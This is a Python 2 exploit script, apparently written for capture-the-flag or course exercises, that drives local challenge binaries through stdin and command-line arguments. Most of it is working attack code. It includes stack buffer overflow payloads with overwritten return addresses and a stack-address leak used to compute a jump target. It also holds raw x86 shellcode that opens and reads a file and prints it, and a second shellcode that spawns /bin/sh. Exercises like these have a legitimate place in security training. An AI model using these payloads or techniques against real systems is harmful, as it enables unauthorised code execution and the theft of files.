#!/usr/bin/python                                                                                                                                                      
# -*- coding: utf-8 -*-
# author: weisu.yxd@taobao.com
from subprocess import Popen, PIPE
import fcntl, os
import time
import string
class Server(object):
    def __init__(self, args, server_env = None):
        if server_env:
            self.process = Popen(args, stdin=PIPE, stdout=PIPE, stderr=PIPE, env=server_env)
        else:
            self.process = Popen(args, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        flags = fcntl.fcntl(self.process.stdout, fcntl.F_GETFL)
        fcntl.fcntl(self.process.stdout, fcntl.F_SETFL, flags | os.O_NONBLOCK)
    def send(self, data, tail = ''):
        self.process.stdin.write(data + tail)
        self.process.stdin.flush()
    def recv(self, t=.1, e=1, tr=5, stderr=0):
        time.sleep(t)
        if tr < 1:
            tr = 1 
        x = time.time()+t
        r = ''
        pr = self.process.stdout
        if stderr:
            pr = self.process.stdout
        while time.time() < x or r:
            r = pr.read()
            if r is None:
                if e:
                    raise Exception(message)
                else:
                    break
            elif r:
                return r.rstrip()
            else:
                time.sleep(max((x-time.time())/tr, 0))
        return r.rstrip()
    def getAddr(self, data):
        print 'getAddr:', self.getStr(data)
        index = data.index(20 * 'A')
        ret_data = data[index + 24 : index + 28]
        strData = ''
        strList = []
        intRet = 0
        _255 = 1
        for i in ret_data:
            strData += '%02x' % ord(i)
            intRet += _255 * ord(i)
            _255 *= 256
            strList.append('0x%02x' % ord(i))
        intRet += 44
        print '%x' % intRet
        newList = []
        for i in range(4):
            newList.append(chr(intRet % 256))
            intRet /= 256
        return strData, newList
    def getStr(self, data):
        strRet = ''
        for i in data:
            strRet += '%02x ' % ord(i)
        return strRet
    
    @staticmethod
    def generateAddr(oriAddr):
        if oriAddr.startswith('0x'):
            oriAddr = oriAddr[2:]
        while oriAddr:
            yield oriAddr[-2:]
            oriAddr = oriAddr[:-2]
    @classmethod
    def getEncAddr(cls, oriAddr):
        strRet = ''
        for i in cls.generateAddr(oriAddr):
            num = string.atoi(i, base=16)
            #print num
            strRet += chr(num)
        return strRet
    def orw(self):
        data = '\x6a\x6d\x68\x6f\x2e\x61\x73\x68\x68\x65\x6c\x6c\x89\xe3\xb9\x40\x00\x00\x00\xba\x01\x01\x00\x00\x31\xc0\xb0\x05\xcd\x80\x89\xc3\x83\xec\x60\x89\xe1\xba\x40\x00\x00\x00\xb0\x03\xcd\x80\xbb\x01\x00\x00\x00\xb0\x04\xcd\x80'
        server.send(data)
        print server.recv()
    def security_3_4(self):
        print server.recv()
if __name__ == "__main__":
    local = 2
    if local == 1:
        ServerArgs = ['/home/32355/challenge/2_orw/orw']
        server = Server(ServerArgs)
        server.orw()
    elif local == 0:
        ServerArgs = ['/home/32355/challenge/1_start/start']
        server = Server(ServerArgs)
        test_data = [20 * 'A' + '\x8b\x80\x04\x08']
        #test_data = [20 * 'A' + '\x00\x00\x00\x00']
        for x in test_data:
            server.send(x)
            ret_data = server.recv()
            ret_data, ret_List = server.getAddr(ret_data)
            print '\nnew:', ret_data
            #y = 44 * 'A' + ''.join(ret_List) + '\x68\x43\x54\x46\x3a\x68\x74\x68\x65\x20\x68\x61\x72\x74\x20\x68\x73\x20\x73\x74\x68\x4c\x65\x74\x27\x89\xe1\xb2\x14\xb3\x01\xb0\x04\xcd\x80'
            y = 44 * 'A' + '\x87\x80\x04\x08'
            print server.getStr(y)
            
            #send time 2
            server.send(y)
            ret_data = server.recv()
            print server.getStr(ret_data)
            
            #send time 3
            y = 20 * 'A' + ''.join(ret_List) + '\xb0\x0b\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
            server.send(y)
            ret_data = server.recv()
            print ret_data
    elif local == 2:
        shellcode = '\x6a\x6d\x68\x6f\x2e\x61\x73\x68\x68\x65\x6c\x6c\x89\xe3\xb9\x40\x00\x00\x00\xba\x01\x01\x00\x00\x31\xc0\xb0\x05\xcd\x80\x89\xc3\x83\xec\x60\x89\xe1\xba\x40\x00\x00\x00\xb0\x03\xcd\x80\xbb\x01\x00\x00\x00\xb0\x04\xcd\x80'
        #shellcode = '\xb0\x0b\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
        lenSehll = len(shellcode)
        arg1 = shellcode + 'a' * (115 - lenSehll) + Server.getEncAddr('0x600c60')
        #arg1 = 'a' * 104 + Server.getEncAddr('0x600c4c') + '\0'
        '''
        ServerArgs = ['/home/32355/test/security/3/3.4', arg1, '123']
        server = Server(ServerArgs)
        server.security_3_4()
        '''
        print arg1